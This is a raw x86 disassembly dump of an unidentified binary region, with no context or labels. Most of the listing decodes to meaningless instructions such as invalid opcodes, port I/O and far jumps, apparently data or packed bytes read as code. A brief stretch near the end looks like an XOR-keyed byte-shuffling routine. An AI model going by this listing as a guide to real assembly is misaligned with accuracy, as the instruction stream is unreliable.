  40c1ea:	jl     0x40c1da
  40c1ec:	or     al,0x2c
  40c1ee:	inc    ecx
  40c1ef:	mov    ch,0x4f
  40c1f1:	sub    ecx,ecx
  40c1f3:	dec    DWORD PTR [edx]
  40c1f5:	inc    ebp
  40c1f6:	mov    dh,0xec
  40c1f8:	icebp  
  40c1f9:	mov    DWORD PTR [ebx-0xd],edi
  40c1fc:	cs pop edi
  40c1fe:	dec    edx
  40c1ff:	gs enter 0x2c27,0x2a
  40c204:	cwde   
  40c205:	push   ds
  40c206:	mov    edi,0x74569868
  40c20b:	lds    ebx,FWORD PTR [ebx-0x52]
  40c20e:	sar    DWORD PTR [ebx*4-0xd0fb5af],1
  40c215:	ja     0x40c23d
  40c217:	cmp    eax,0xc348d4b1
  40c21c:	mov    eax,0x514bde81
  40c221:	fwait
  40c222:	sbb    dh,dh
  40c224:	mov    al,0x32
  40c226:	pop    ecx
  40c227:	(bad)  
  40c229:	cmc    
  40c22a:	outs   dx,DWORD PTR ds:[esi]
  40c22c:	mov    al,0xf9
  40c22e:	and    al,0xea
  40c230:	in     eax,0xf4
  40c232:	fisub  WORD PTR [edx*2+0x30edddd0]
  40c239:	fiadd  DWORD PTR [eax]
  40c23b:	sbb    bh,BYTE PTR [ebp-0x58]
  40c23e:	xchg   BYTE PTR [esp+ecx*2],cl
  40c241:	stos   DWORD PTR es:[edi],eax
  40c242:	test   DWORD PTR ds:[ebx+0x2f4c44e1],eax
  40c249:	jle    0x40c279
  40c24b:	loopne 0x40c247
  40c24d:	xchg   esp,eax
  40c24f:	loopne 0x40c1dd
  40c251:	fimul  WORD PTR [edi]
  40c253:	and    DWORD PTR [ebx-0x3c0c5e41],0xffffffac
  40c25a:	loope  0x40c217
  40c25c:	cmp    al,0xf6
  40c25e:	sub    cl,ch
  40c260:	imul   edx,DWORD PTR [ecx],0x9de9bdd2
  40c266:	xor    eax,0x46ef46df
  40c26b:	int3   
  40c26c:	mov    bh,0xf
  40c26e:	jne    0x40c217
  40c270:	fadd   st(2),st
  40c272:	xchg   BYTE PTR [edi-0x1db9cfc3],dl
  40c278:	dec    ecx
  40c279:	imul   eax,DWORD PTR [edx+0x47],0x1be0b420
  40c280:	in     eax,dx
  40c281:	mov    dl,0x9f
  40c283:	sub    al,BYTE PTR [ebx-0x7c]
  40c286:	aaa    
  40c287:	pop    edx
  40c288:	and    BYTE PTR [eax],ah
  40c28a:	aad    0x4f
  40c28c:	repnz pop edx
  40c28e:	fwait
  40c28f:	add    dl,BYTE PTR [eax-0x5490938c]
  40c295:	pop    esi
  40c296:	icebp  
  40c297:	inc    esi
  40c298:	mov    dh,0x10
  40c29a:	inc    edx
  40c29b:	adc    al,0xcd
  40c29d:	icebp  
  40c29e:	(bad)  [edx+0x1]
  40c2a1:	ss sahf 
  40c2a3:	popa   
  40c2a4:	ss test al,0x72
  40c2a7:	lods   eax,DWORD PTR ds:[esi]
  40c2a8:	xchg   ebx,eax
  40c2a9:	jns    0x40c30d
  40c2ab:	pop    esi
  40c2ac:	(bad)  
  40c2ad:	dec    edi
  40c2ae:	cmp    eax,0x38d23eb7
  40c2b3:	inc    edi
  40c2b4:	push   0x6a
  40c2b6:	cmp    BYTE PTR [eax+0x641b1b9a],0xb2
  40c2bd:	or     BYTE PTR [eax-0x3aa26c1e],al
  40c2c3:	pop    ds
  40c2c4:	sbb    BYTE PTR [eax+0x15],al
  40c2c7:	sbb    eax,0xf36663fa
  40c2cc:	jo     0x40c25a
  40c2ce:	jne    0x40c334
  40c2d0:	mov    esi,DWORD PTR [edi]
  40c2d2:	arpl   WORD PTR [ebx-0x3a],ax
  40c2d5:	std    
  40c2d6:	aam    0xb7
  40c2d8:	loopne 0x40c2bc
  40c2da:	call   0x17b35c0a
  40c2df:	jmp    0x2001:0x19ac5a13
  40c2e6:	add    eax,DWORD PTR [eax]
  40c2e8:	cmp    ah,BYTE PTR [esi+0x4be203e9]
  40c2ee:	cmc    
  40c2ef:	or     edx,esi
  40c2f1:	int    0x3c
  40c2f3:	sbb    BYTE PTR [ebp+0x79],0x36
  40c2f7:	mov    DWORD PTR [ecx+0x23afb419],ebp
  40c2fd:	cmp    BYTE PTR [edx+0x74f26ffb],bl
  40c303:	mov    ebx,0xc06ca5c8
  40c308:	stos   BYTE PTR es:[edi],al
  40c309:	test   BYTE PTR [ebx+0x35],bl
  40c30c:	xor    BYTE PTR ds:[edi-0x7b026eda],ah
  40c313:	retf   
  40c314:	call   0xba3f910a
  40c319:	adc    BYTE PTR [ebp+0x55],al
  40c31c:	cld    
  40c31d:	pop    esp
  40c31e:	pop    ebp
  40c31f:	(bad)
  40c323:	or     eax,0xfae5b532
  40c328:	shr    BYTE PTR [edx-0xd],0xb
  40c32c:	in     al,dx
  40c32d:	or     al,0xd8
  40c32f:	jl     0x40c347
  40c331:	mov    eax,0x5a3a58d5
  40c336:	fisttp DWORD PTR [esi]
  40c338:	and    al,0xa2
  40c33a:	mov    eax,ds:0x122999fd
  40c33f:	mov    ebx,0x3f210aa4
  40c344:	mov    ebp,0x8ef50d7b
  40c349:	clc    
  40c34a:	jnp    0x40c380
  40c34c:	xchg   esp,eax
  40c34d:	push   ds
  40c34e:	aam    0xc6
  40c350:	sbb    eax,0x4468ab77
  40c355:	dec    eax
  40c356:	(bad)  
  40c357:	test   eax,0x60432dc2
  40c35c:	xor    BYTE PTR [eax+0x392392f4],cl
  40c362:	je     0x40c328
  40c364:	and    BYTE PTR [esi+0x4a],bh
  40c367:	into   
  40c368:	sub    eax,0x6bb18c2f
  40c36d:	stos   DWORD PTR es:[edi],eax
  40c36e:	jge    0x40c380
  40c370:	mov    al,0x75
  40c372:	xchg   edx,eax
  40c373:	xchg   DWORD PTR [ebp-0x76003251],eax
  40c379:	adc    dl,ah
  40c37b:	call   0x222cdf9b
  40c380:	cmp    eax,DWORD PTR gs:[edi+0x57]
  40c384:	aam    0x39
  40c386:	lock mov DWORD PTR [esi+0x1d6f2132],eax
  40c38d:	fist   DWORD PTR [ebp-0x43]
  40c390:	aaa    
  40c391:	iret   
  40c392:	mov    ds:0xf6494c6a,al
  40c397:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c398:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c399:	pop    es
  40c39a:	xor    DWORD PTR [eax-0x7a6fd5],0xcbd9037
  40c3a4:	adc    ch,0xaf
  40c3a7:	inc    esp
  40c3a8:	out    dx,eax
  40c3a9:	retf   
  40c3aa:	add    eax,0x50741e4c
  40c3af:	outs   dx,DWORD PTR ds:[esi]
  40c3b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3b1:	leave  
  40c3b2:	mov    eax,ds:0xf2ecf9e9
  40c3b7:	stc    
  40c3b8:	jecxz  0x40c3fb
  40c3ba:	dec    esi
  40c3bb:	xchg   esp,eax
  40c3bc:	pop    es
  40c3bd:	push   ss
  40c3be:	repz dec ebx
  40c3c0:	mov    bh,0x90
  40c3c2:	(bad)  
  40c3c3:	push   ebx
  40c3c4:	mov    eax,ds:0x793b4c0
  40c3c9:	shl    DWORD PTR [eax-0x2e],0x84
  40c3cd:	out    dx,eax
  40c3ce:	out    dx,eax
  40c3cf:	push   ebx
  40c3d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3d1:	fcmovnbe st,st(0)
  40c3d3:	sti    
  40c3d4:	sub    al,0xfe
  40c3d6:	into   
  40c3d7:	jns    0x40c397
  40c3d9:	repz adc esp,DWORD PTR [ecx-0x43]
  40c3dd:	int3   
  40c3de:	sahf   
  40c3df:	sbb    bh,BYTE PTR [edx]
  40c3e1:	jle    0x40c3e8
  40c3e3:	xchg   ebp,eax
  40c3e4:	push   cs
  40c3e5:	leave  
  40c3e6:	sbb    esi,ecx
  40c3e8:	outs   dx,BYTE PTR ds:[esi]
  40c3e9:	fidiv  DWORD PTR [edx]
  40c3eb:	lock rcl DWORD PTR [esi+0xc],0x15
  40c3f0:	jp     0x40c425
  40c3f2:	dec    ebp
  40c3f3:	out    0xaa,eax
  40c3f5:	xor    BYTE PTR [ecx+ebx*4-0x49],cl
  40c3f9:	dec    edi
  40c3fa:	fstp   TBYTE PTR [eax+0x60]
  40c3fd:	sub    BYTE PTR [esi+esi*2+0x39e79bcb],bl
  40c404:	fst    DWORD PTR [eax-0x5]
  40c407:	retf   
  40c408:	jmp    0x33e0885d
  40c40d:	add    esp,edx
  40c40f:	dec    esp
  40c410:	jg     0x40c471
  40c412:	retf   0xb846
  40c415:	sub    BYTE PTR [edx-0x3f0832a0],bh
  40c41b:	fnstsw WORD PTR [ebp+0x31bac527]
  40c421:	ror    DWORD PTR [ebp+0x78],cl
  40c424:	iret   
  40c425:	pop    esp
  40c426:	dec    edi
  40c427:	xchg   edi,eax
  40c428:	adc    dl,ah
  40c42a:	jmp    0x3a549158
  40c42f:	lods   al,BYTE PTR ds:[esi]
  40c430:	shl    BYTE PTR [esi+0x49],cl
  40c433:	dec    edx
  40c434:	jnp    0x40c416
  40c436:	sub    DWORD PTR [edi],0xffffff89
  40c439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c43a:	mov    eax,0xc08f8dbb
  40c43f:	loope  0x40c440
  40c441:	ret    
  40c442:	(bad)  
  40c443:	push   ebp
  40c444:	xor    ecx,ecx
  40c446:	test   DWORD PTR [ebp+0x46],ebp
  40c449:	popa   
  40c44a:	leave  
  40c44b:	mov    ch,0x57
  40c44d:	test   eax,0x1f3e5860
  40c452:	xchg   ecx,eax
  40c453:	xor    esp,DWORD PTR [edi+0x22]
  40c456:	or     eax,0x7d163430
  40c45b:	sbb    ch,BYTE PTR [ecx]
  40c45d:	mov    bl,0xcb
  40c45f:	adc    al,0x2c
  40c461:	pop    esp
  40c462:	xlat   BYTE PTR ds:[ebx]
  40c463:	es push edx
  40c465:	pop    ebx
  40c466:	or     bh,BYTE PTR [ebp-0x12]
  40c469:	inc    ebp
  40c46a:	ds jp  0x40c48d
  40c46d:	jnp    0x40c450
  40c46f:	addr16 out dx,al
  40c471:	into   
  40c472:	and    DWORD PTR [edi-0x52ad989d],ebx
  40c478:	inc    ecx
  40c479:	push   ebp
  40c47a:	push   cs
  40c47b:	xchg   ebp,eax
  40c47c:	test   al,0x80
  40c47e:	dec    ebx
  40c47f:	mov    ds:0xda2a6e08,eax
  40c484:	shr    BYTE PTR [eax-0x7bc14507],0x1b
  40c48b:	scas   eax,DWORD PTR es:[edi]
  40c48c:	sub    BYTE PTR [edi+0x721f4084],bl
  40c492:	mov    WORD PTR ds:0xefde3059,?
  40c498:	fist   WORD PTR [esi-0xd]
  40c49b:	sub    dh,BYTE PTR [edx+ecx*8+0x63423f05]
  40c4a2:	cmc    
  40c4a3:	mov    al,0x64
  40c4a6:	movq   QWORD PTR [edx],mm4
  40c4a9:	mov    esi,0x7fb1b87d
  40c4ae:	dec    esi
  40c4af:	or     DWORD PTR [eax-0x1a08c6b6],ebx
  40c4b5:	push   ds
  40c4b6:	push   es
  40c4b7:	dec    ebp
  40c4b8:	ffree  st(2)
  40c4ba:	jle    0x40c442
  40c4bc:	or     cl,ah
  40c4be:	ds pop ss
  40c4c0:	and    eax,0xae44ade6
  40c4c5:	test   DWORD PTR [ebp+0x6a17401b],edi
  40c4cb:	cmp    DWORD PTR [edi],ebp
  40c4cd:	popf   
  40c4ce:	jle    0x40c492
  40c4d0:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40c4d2:	push   edx
  40c4d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4d4:	cmp    al,0x45
  40c4d6:	push   esp
  40c4d7:	add    eax,0xbfdbe6fe
  40c4dc:	cdq    
  40c4dd:	mov    bl,0x2b
  40c4df:	cmc    
  40c4e0:	lea    ebp,[eax+0x12]
  40c4e3:	mov    WORD PTR [eax],cs
  40c4e5:	in     al,dx
  40c4e6:	shl    DWORD PTR [ebp+0x2b2d467f],1
  40c4ec:	fld    TBYTE PTR [ebx-0x5e66a8ec]
  40c4f2:	jb     0x40c4e5
  40c4f4:	and    BYTE PTR [esi],al
  40c4f6:	mov    eax,0x9493c3ce
  40c4fb:	jae    0x40c555
  40c4fd:	loope  0x40c50f
  40c4ff:	inc    ebx
  40c500:	sbb    BYTE PTR [ecx-0x75],0x58
  40c504:	xchg   DWORD PTR [eax-0x175b0035],edx
  40c50a:	ror    DWORD PTR [esi+0x73],0xde
  40c50e:	rol    DWORD PTR [edi-0x3d],0xb4
  40c512:	push   0x46711485
  40c517:	mov    ecx,0x530b89a8
  40c51c:	push   ecx
  40c51d:	test   al,0x60
  40c51f:	push   ebp
  40c520:	push   ss
  40c521:	popf   
  40c522:	ja     0x40c4fa
  40c524:	icebp  
  40c525:	sbb    esp,ebp
  40c527:	out    0x94,eax
  40c529:	sub    bh,0x88
  40c52c:	push   ds
  40c52d:	(bad)  
  40c52e:	sbb    BYTE PTR [eax-0xd],ah
  40c531:	push   ecx
  40c532:	dec    edi
  40c533:	push   0x7a
  40c535:	inc    edx
  40c536:	cdq    
  40c537:	push   ebp
  40c538:	in     eax,0xdf
  40c53a:	jl     0x40c510
  40c53c:	push   cs
  40c53d:	mov    ecx,0x8b112d56
  40c542:	push   ebp
  40c543:	call   0x5544957b
  40c548:	in     al,dx
  40c549:	mov    edi,DWORD PTR [ebp-0x1c]
  40c54c:	jmp    0x40c8bf
  40c551:	push   esp
  40c552:	pushf  
  40c553:	scas   al,BYTE PTR es:[edi]
  40c554:	stos   DWORD PTR es:[edi],eax
  40c555:	jbe    0x40c50c
  40c557:	pop    ebp
  40c558:	arpl   WORD PTR ds:0xa769733d,si
  40c55e:	gs mov dh,0x3f
  40c561:	xchg   edi,eax
  40c562:	xchg   ebp,eax
  40c563:	jl     0x40c5e1
  40c565:	retf   0x7c79
  40c568:	jl     0x40c5a9
  40c56a:	jbe    0x40c5ae
  40c56c:	imul   esi,DWORD PTR [esi+0x1c],0x22ae15e3
  40c573:	out    0x17,eax
  40c575:	adc    DWORD PTR fs:[ebx],edx
  40c578:	push   ecx
  40c579:	out    0x3c,al
  40c57b:	pop    ebp
  40c57c:	pop    ebp
  40c57d:	in     al,dx
  40c57e:	or     DWORD PTR ds:0x120cd849,edx
  40c584:	mov    eax,0xf8dd8958
  40c589:	gs or  al,0xfa
  40c58c:	icebp  
  40c58d:	jae    0x40c540
  40c58f:	xor    DWORD PTR [eax+0x7f],eax
  40c592:	lods   al,BYTE PTR ds:[esi]
  40c593:	rol    BYTE PTR [ebx-0x10937975],cl
  40c599:	fidivr WORD PTR [edi+eiz*1-0x31]
  40c59d:	cmp    al,BYTE PTR [ebp+ecx*4+0x73]
  40c5a1:	ret    0x9308
  40c5a4:	adc    BYTE PTR [edi+0x4e],ah
  40c5a7:	mov    es:0x1351059f,al
  40c5ad:	dec    eax
  40c5ae:	call   0xe83a4a30
  40c5b3:	push   ebx
  40c5b4:	fcomi  st,st(3)
  40c5b6:	test   DWORD PTR [esi],ebp
  40c5b8:	jecxz  0x40c541
  40c5ba:	push   ebp
  40c5bb:	pop    ds
  40c5bc:	add    ebx,DWORD PTR [esi+ecx*4-0x1]
  40c5c0:	leave  
  40c5c1:	mov    bh,0xff
  40c5c3:	sti    
  40c5c4:	out    dx,eax
  40c5c5:	pop    esp
  40c5c6:	leave  
  40c5c7:	or     esp,DWORD PTR [edi-0x1f]
  40c5ca:	repz addr16 and al,cl
  40c5ce:	(bad)  
  40c5d0:	cmp    eax,0x812e8b05
  40c5d5:	gs and esp,ebx
  40c5d8:	into   
  40c5d9:	out    0xe1,eax
  40c5db:	out    dx,al
  40c5dc:	pop    edi
  40c5dd:	mov    ds:0xd6384e2d,al
  40c5e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5e3:	cmp    DWORD PTR [edi+0x1dcccbc0],ecx
  40c5e9:	inc    edx
  40c5ea:	mov    eax,ds:0x43d2d4f3
  40c5ef:	mov    ebx,0x912f998d
  40c5f4:	test   BYTE PTR ds:0xe6673904,dh
  40c5fa:	ins    BYTE PTR es:[edi],dx
  40c5fb:	scas   eax,DWORD PTR es:[edi]
  40c5fc:	and    ch,BYTE PTR [ebx+0x4e]
  40c5ff:	outs   dx,BYTE PTR ds:[esi]
  40c600:	jg     0x40c58d
  40c602:	jnp    0x40c655
  40c604:	dec    ecx
  40c605:	je     0x40c58a
  40c607:	mov    ebx,0xea28321f
  40c60c:	retf   0x50b
  40c60f:	or     BYTE PTR [esi],ch
  40c611:	fcom   QWORD PTR [edi+0x15]
  40c614:	mov    cl,0x27
  40c616:	dec    edx
  40c617:	lds    ecx,FWORD PTR [ebx-0x62]
  40c61a:	rcl    bl,0xc0
  40c61d:	mov    eax,0x4281db0c
  40c622:	inc    ebx
  40c623:	enter  0xc244,0xad
  40c627:	call   0x1339:0x34e05654
  40c62e:	in     al,dx
  40c62f:	jae    0x40c6a1
  40c631:	jnp    0x40c656
  40c633:	xchg   ecx,eax
  40c634:	aaa    
  40c635:	outs   dx,BYTE PTR ds:[esi]
  40c636:	jb     0x40c677
  40c638:	and    al,0x99
  40c63a:	and    eax,0x480eedc7
  40c63f:	add    BYTE PTR [ebx+0x1c],bh
  40c642:	pop    edx
  40c643:	loop   0x40c5d7
  40c645:	pop    esp
  40c646:	test   DWORD PTR [esi+0x46],0x864508fb
  40c64d:	bound  edx,QWORD PTR [ecx]
  40c64f:	(bad)  
  40c650:	and    dl,BYTE PTR [edi-0x40305dbe]
  40c656:	inc    esp
  40c657:	test   al,0x3
  40c659:	adc    eax,0x717cfa03
  40c65e:	lods   al,BYTE PTR ds:[esi]
  40c65f:	lods   eax,DWORD PTR ds:[esi]
  40c660:	xchg   ebx,eax
  40c661:	push   0xffffffb7
  40c663:	fnstsw WORD PTR [ebx]
  40c665:	loope  0x40c61c
  40c667:	outs   dx,DWORD PTR ds:[esi]
  40c668:	dec    edi
  40c669:	mov    ecx,0xffc00fed
  40c66e:	pop    ebp
  40c66f:	xchg   esp,eax
  40c670:	inc    esi
  40c671:	mov    esp,0xa0234267
  40c676:	push   cs
  40c677:	and    eax,0x5530b903
  40c67c:	pushf  
  40c67d:	iret   
  40c67e:	sbb    eax,0xaf4e2329
  40c683:	cmp    eax,0x438ccac2
  40c688:	dec    ebp
  40c689:	loopne 0x40c646
  40c68b:	popf   
  40c68c:	sub    DWORD PTR [edi-0x51],ecx
  40c68f:	dec    ebp
  40c690:	into   
  40c691:	shl    esi,1
  40c693:	aas    
  40c694:	pop    edx
  40c695:	push   es
  40c696:	jg     0x40c6f0
  40c698:	push   eax
  40c699:	mov    ebx,0x62e820ec
  40c69e:	sbb    al,0x1a
  40c6a0:	mov    edx,0xaa65471a
  40c6a5:	inc    BYTE PTR [esi-0x7d]
  40c6a8:	mov    bh,0x52
  40c6aa:	and    BYTE PTR [esi+0x1a65de4],bh
  40c6b0:	ins    DWORD PTR es:[edi],dx
  40c6b1:	stc    
  40c6b2:	aaa    
  40c6b3:	sbb    BYTE PTR [ebp-0x7cae43f9],al
  40c6b9:	jne    0x40c6dd
  40c6bb:	add    DWORD PTR [edx],esp
  40c6bd:	mov    eax,ds:0x5524c36c
  40c6c2:	mov    esi,0x8a5c36bc
  40c6c7:	dec    ebx
  40c6c8:	xchg   edi,eax
  40c6c9:	pop    ebp
  40c6ca:	mov    ebx,DWORD PTR [edi-0x2844cef4]
  40c6d0:	pushf  
  40c6d1:	leave  
  40c6d2:	ficom  WORD PTR ds:0xa8114d0e
  40c6d8:	iret   
  40c6d9:	add    al,0x49
  40c6db:	adc    al,0xaa
  40c6dd:	inc    ecx
  40c6de:	fs fucomip st,st(7)
  40c6e1:	in     eax,0xed
  40c6e3:	sbb    BYTE PTR [ebx-0x54bda49e],bl
  40c6e9:	pop    esi
  40c6ea:	scas   eax,DWORD PTR es:[edi]
  40c6eb:	loopne 0x40c762
  40c6ed:	jb     0x40c6bc
  40c6ef:	sub    esi,esi
  40c6f1:	out    dx,eax
  40c6f2:	adc    ah,BYTE PTR [esi+eiz*4]
  40c6f5:	mov    ebp,DWORD PTR [esi-0x5d5325fb]
  40c6fb:	ret    0xe3d5
  40c6fe:	fnsave [ebx]
  40c700:	jmp    0xe4f4:0xb13ae80a
  40c707:	push   ds
  40c708:	jecxz  0x40c6c9
  40c70a:	dec    ebx
  40c70b:	jns    0x40c763
  40c70d:	pop    ss
  40c70e:	into   
  40c70f:	sub    BYTE PTR [ebp-0x19e8d927],bl
  40c715:	push   0xffffffd7
  40c717:	pop    edi
  40c718:	(bad)  
  40c719:	and    BYTE PTR [ecx-0x7a],ch
  40c71c:	out    dx,eax
  40c71d:	pop    ds
  40c71e:	or     ch,0x30
  40c721:	ret    
  40c722:	lds    esi,FWORD PTR [eax-0x623a258d]
  40c728:	jle    0x40c749
  40c72a:	dec    edx
  40c72b:	femms  
  40c72d:	aad    0x96
  40c72f:	dec    esp
  40c730:	jecxz  0x40c76b
  40c732:	push   edi
  40c733:	inc    edx
  40c734:	fadd   st,st(7)
  40c736:	cli    
  40c737:	cmp    DWORD PTR gs:[eax],ebp
  40c73a:	dec    edi
  40c73b:	repnz xor al,0x23
  40c73e:	in     al,dx
  40c73f:	mov    ebp,DWORD PTR [ebx+0x4f]
  40c742:	(bad)  
  40c743:	mov    esi,0x78767ee7
  40c748:	sub    BYTE PTR [eax+0x32],0x9
  40c74c:	add    DWORD PTR [ecx-0x6b058e41],0xe587ff91
  40c756:	out    0xdc,al
  40c758:	jmp    0x9f74:0xc801f490
  40c75f:	rcr    DWORD PTR [eax],0x17
  40c762:	adc    dl,BYTE PTR [ebx+eax*1-0x5a]
  40c766:	pop    edx
  40c767:	push   ds
  40c768:	push   esi
  40c769:	mov    esi,0xf01af89e
  40c76e:	or     DWORD PTR [ebx-0x1a4b17da],ebp
  40c774:	out    dx,eax
  40c775:	jg     0x40c75d
  40c777:	xor    dh,ah
  40c779:	sub    eax,0x180beb25
  40c77e:	dec    ebp
  40c77f:	mov    ah,0xc1
  40c781:	mov    ds:0x89351d4b,eax
  40c786:	xchg   ebp,eax
  40c787:	fs std 
  40c789:	inc    esp
  40c78a:	mov    dl,0x75
  40c78c:	je     0x40c7ef
  40c78e:	addr16 mov cl,0xc1
  40c791:	dec    ebx
  40c792:	xchg   esi,eax
  40c793:	nop
  40c794:	cmp    edx,ecx
  40c796:	mov    ebp,DWORD PTR [esi+esi*4]
  40c799:	daa    
  40c79a:	inc    edi
  40c79b:	pop    esi
  40c79c:	inc    ecx
  40c79d:	stos   BYTE PTR es:[edi],al
  40c79e:	sub    eax,0x1a3a5bfd
  40c7a3:	sub    BYTE PTR [esp+edi*4-0x62cd6e5c],0x6
  40c7ab:	leave  
  40c7ac:	sahf   
  40c7ad:	inc    esp
  40c7ae:	and    al,0x3e
  40c7b0:	dec    ebx
  40c7b1:	outs   dx,DWORD PTR ds:[esi]
  40c7b2:	out    0x38,al
  40c7b4:	loope  0x40c74b
  40c7b6:	repz jmp 0x40c77a
  40c7b9:	aam    0xf7
  40c7bb:	fld    TBYTE PTR [eax+esi*2-0x4a814adb]
  40c7c2:	mov    ecx,0x11cd6505
  40c7c7:	popf   
  40c7c8:	ror    DWORD PTR [eax+0x6d],0x79
  40c7cc:	xor    eax,0x95989bc2
  40c7d1:	mov    cl,0x1a
  40c7d3:	sbb    ebp,esp
  40c7d5:	xor    DWORD PTR [ecx+0x67f157a6],ebp
  40c7db:	sub    ch,bl
  40c7dd:	(bad)
  40c7e0:	xchg   BYTE PTR [ecx+0x7d],bh
  40c7e3:	jge    0x40c790
  40c7e5:	cmp    DWORD PTR [ebp-0x5a417e2a],ebx
  40c7eb:	cli    
  40c7ec:	lods   eax,DWORD PTR ds:[esi]
  40c7ed:	jg     0x40c7ca
  40c7ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7f0:	xchg   ebp,eax
  40c7f1:	and    al,0xaa
  40c7f3:	xchg   edx,eax
  40c7f4:	das    
  40c7f5:	adc    BYTE PTR [ebx+0x15a33f88],bl
  40c7fb:	dec    esp
  40c7fc:	inc    ebp
  40c7fd:	fwait
  40c7fe:	jmp    0x6039:0x674a6e8a
  40c805:	xor    edi,edi
  40c807:	jmp    0x488b:0xfd9bb4ee
  40c80e:	lahf   
  40c80f:	pusha  
  40c810:	xor    ebp,DWORD PTR [ecx]
  40c812:	adc    al,0xf2
  40c814:	sbb    ch,cl
  40c816:	aam    0xf
  40c818:	scas   al,BYTE PTR es:[edi]
  40c819:	cmp    DWORD PTR [edx-0x9],esp
  40c81c:	mov    ds:0xb9c11b13,eax
  40c821:	xchg   esi,eax
  40c822:	ficomp WORD PTR [ecx+edx*1]
  40c825:	loopne 0x40c7ee
  40c827:	js     0x40c804
  40c829:	jmp    0x40c8a5
  40c82b:	sub    DWORD PTR ds:0x5e3c1c2f,ebp
  40c831:	mov    dl,0x98
  40c833:	cmp    eax,0x28c61b99
  40c838:	scas   eax,DWORD PTR es:[edi]
  40c839:	mov    al,0xf3
  40c83b:	cmc    
  40c83c:	add    DWORD PTR [esi-0x4ca9b07f],esp
  40c842:	dec    esi
  40c843:	ret    
  40c844:	pop    ebp
  40c845:	mov    dl,0x1e
  40c847:	or     BYTE PTR [ebx],0x29
  40c84a:	test   DWORD PTR [esi+0x68],0xabf2955e
  40c851:	aad    0xbc
  40c853:	xchg   ecx,eax
  40c854:	lahf   
  40c855:	pop    ebx
  40c856:	or     DWORD PTR [eax],0x37
  40c859:	mov    esi,0x9cce4477
  40c85e:	shl    DWORD PTR [ebx],cl
  40c860:	ds push esi
  40c862:	dec    BYTE PTR [eax]
  40c864:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c865:	hlt    
  40c866:	sub    ah,dh
  40c868:	dec    ebp
  40c869:	int3   
  40c86a:	gs pop esp
  40c86c:	jge    0x40c8d2
  40c86e:	ret    
  40c86f:	(bad)  
  40c870:	and    esi,DWORD PTR [ecx]
  40c872:	mov    BYTE PTR ds:0x1106a8e5,dh
  40c878:	jp     0x40c831
  40c87a:	jg     0x40c824
  40c87c:	add    dh,BYTE PTR [eax]
  40c87e:	das    
  40c87f:	sub    BYTE PTR [edi-0x24],0x90
  40c883:	std    
  40c884:	jp     0x40c84d
  40c886:	outs   dx,DWORD PTR ds:[esi]
  40c887:	imul   esp,DWORD PTR [ebx],0x5f56632f
  40c88d:	push   esi
  40c88e:	bound  esp,QWORD PTR [ebp*4+0x5f20a277]
  40c895:	push   edx
  40c896:	aam    0xcc
  40c898:	repz mov dh,0x60
  40c89b:	cwde   
  40c89c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c89d:	cmp    dh,dh
  40c89f:	mov    al,ds:0x41c696b1
  40c8a4:	dec    edi
  40c8a5:	mov    WORD PTR [eax+esi*8+0x76eef069],ss
  40c8ac:	inc    ecx
  40c8ad:	fsub   DWORD PTR [ecx+0x78]
  40c8b0:	jg     0x40c915
  40c8b2:	lods   eax,DWORD PTR ds:[esi]
  40c8b3:	daa    
  40c8b4:	xor    al,0x4e
  40c8b6:	pop    esi
  40c8b7:	pop    eax
  40c8b8:	sbb    bl,BYTE PTR ds:0xf234bd83
  40c8be:	mov    esi,0x9a3a948a
  40c8c3:	jb     0x40c8f7
  40c8c5:	add    BYTE PTR [eax+0x558b0f55],cl
  40c8cb:	hlt    
  40c8cc:	xor    edx,eax
  40c8ce:	add    edx,DWORD PTR [ebp-0x14]
  40c8d1:	mov    edi,DWORD PTR [ebp-0x1c]
  40c8d4:	mov    dl,BYTE PTR [edx+edi*1+0x32729a]
  40c8db:	mov    BYTE PTR [ebp+0xb],dl
  40c8de:	mov    dl,BYTE PTR [ebp+0xf]
  40c8e1:	mov    edi,DWORD PTR [ebp-0xc]
  40c8e4:	xor    edi,eax
  40c8e6:	add    edi,DWORD PTR [ebp-0x14]
  40c8e9:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8ec:	mov    BYTE PTR [edi+ebx*1+0x32729a],dl
  40c8f3:	mov    dl,BYTE PTR [ebp+0xb]
  40c8f6:	mov    edi,DWORD PTR [ebp-0x18]
  40c8f9:	xor    edi,eax
  40c8fb:	add    edi,DWORD PTR [ebp-0x14]
  40c8fe:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c901:	mov    BYTE PTR [edi+ebx*1+0x32729a],dl
  40c908:	mov    edx,DWORD PTR [ebp-0x44]
  40c90b:	mov    edi,DWORD PTR [ebp-0xc]
  40c90e:	xor    edx,eax
  40c910:	xor    edi,eax
  40c912:	jmp    0x40cc85
  40c917:	dec    si
  40c919:	(bad)  
  40c91a:	mov    dh,0xf7
  40c91c:	mov    cl,0x71
  40c91e:	dec    esi
  40c91f:	imul   esp,DWORD PTR [eax+0x63],0xffffff8e
  40c923:	popa   
  40c924:	out    0x51,eax
  40c926:	add    eax,0x7c7c966d
  40c92b:	retf   0x7c79
  40c92e:	jl     0x40c921
  40c930:	nop
  40c931:	popf   
  40c932:	jnp    0x40c9a7
  40c934:	xchg   DWORD PTR [ebp-0x7113ade9],ecx
  40c93a:	mov    ebx,ebp
  40c93c:	pop    esi
  40c93d:	xor    eax,0x8df20e1f
  40c942:	in     al,0x9e
  40c944:	dec    eax
  40c945:	push   esi
  40c946:	pop    edx
  40c947:	jl     0x40c927
  40c949:	sub    al,0x0
  40c94b:	inc    eax
  40c94c:	lahf   
  40c94d:	ds icebp 
  40c94f:	fist   DWORD PTR ds:0x4e9d85e3
  40c955:	call   0x311a:0xb93ca011
  40c95c:	je     0x40c9b4
  40c95e:	mov    BYTE PTR [esi-0x463b2b3e],0x8a
  40c965:	clc    
  40c966:	mov    dl,0x16
  40c968:	icebp  
  40c969:	inc    edi
  40c96a:	mov    ds:0x7c6a0f6a,al
